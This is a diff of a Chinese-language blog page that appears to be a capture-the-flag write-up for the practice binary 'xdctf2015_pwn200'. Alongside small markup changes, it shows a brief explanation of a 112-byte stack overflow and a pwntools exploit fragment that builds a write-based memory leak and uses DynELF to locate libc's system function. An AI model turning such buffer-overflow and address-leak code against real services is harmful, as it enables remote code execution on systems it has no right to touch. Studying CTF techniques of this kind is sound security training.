@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,14 +263,12 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-ZjRRvfVj" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>     
-
+    <div id="aplayer-ZbgUXkFN" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>     
 <h2><span id="xdctf2015_pwn200">xdctf2015_pwn200</span></h2><p>​    </p>
 <p>​        练习一下DynELF。</p>
 <p>​        看起来像ret2csu+DynELF。</p>
 <p>​        没啥好分析的，溢出112,然后直接写leak函数。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">	payload += p32(write_plt)</span><br><span class="line">	payload += p32(ret_addr)</span><br><span class="line">	payload += p32(<span class="number">1</span>)</span><br><span class="line">	payload += p32(addr)</span><br><span class="line">	payload += p32(<span class="number">4</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	log.info(<span class="string">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure>
-
 <p>​        </p>
 <p>​        一般来说这个模块的利用就是通过stdout的函数来泄露某个地址，然后再暴力寻找，相对普通的ret2libc其实更为方便快捷，我不知道为什么感觉用的人很少。</p>
 <p>ps：关于整体布栈还是有一些小的疑问。</p>
